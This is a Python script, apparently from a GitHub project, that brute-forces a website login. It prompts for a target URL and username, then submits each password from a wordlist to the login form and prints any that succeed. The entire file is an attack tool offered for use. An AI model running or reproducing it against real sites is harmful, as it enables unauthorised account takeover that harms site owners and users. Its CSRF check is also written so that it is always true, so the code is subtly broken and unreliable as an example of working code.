######################################################################################################
# Title: Brute force                                                                                 #
# Author: Tanvir Hossain Antu                                                                        #
# Github : https://github.com/Antu7      
# If you use the code give me the credit please #
######################################################################################################

print (""" 

██████  ██████  ██    ██ ████████ ███████     ███████  ██████  ██████   ██████ ███████ 
██   ██ ██   ██ ██    ██    ██    ██          ██      ██    ██ ██   ██ ██      ██      
██████  ██████  ██    ██    ██    █████       █████   ██    ██ ██████  ██      █████   
██   ██ ██   ██ ██    ██    ██    ██          ██      ██    ██ ██   ██ ██      ██      
██████  ██   ██  ██████     ██    ███████     ██       ██████  ██   ██  ██████ ███████                                                            
                                                                            
                   Tanvir Hossain Antu
        https://github.com/Antu7/python-bruteForce


""")

banner = """     



                       Checking the Server !!
        
        [+]█████████████████████████████████████████████████[+]



"""


import requests
import time
import sys

class BruteForceCracker:
    def __init__(self, url, username, error_message):
        self.url = url
        self.username = username
        self.error_message = error_message
        
        for run in banner:
            sys.stdout.write(run)
            sys.stdout.flush()
            time.sleep(0.02)

    def crack(self, passwords):
        count = 0
        for password in passwords:
            password = password.strip()
            count = count + 1
            print("Trying Password: "+ str(count) + ' Time For => ' + password)
            data_dict = {"LogInID": self.username,"Password": password, "Log In":"submit"}
            response = requests.post(self.url, data=data_dict)
            if self.error_message in str(response.content):
                pass
            elif "CSRF" or "csrf" in str(response.content):
                print("CSRF Token Detected!! BruteF0rce Not Working This Website.")
                return
            else:
                print("Username: ---> " + self.username)
                print("Password: ---> " + password)
                return
        print("[!!] password not in list")


def main():
    url = input("Enter Target Url: ")
    username = input("Enter Target Username: ")
    error = input("Enter Wrong Password Error Message: ")
    cracker = BruteForceCracker(url, username, error)

    try:
        with open("passwords.txt", "r") as passwords:
            cracker.crack(passwords)
    except:
        print("Some Error Occurred Please Check Your Internet Connection !!")

if __name__ == '__main__':
    main()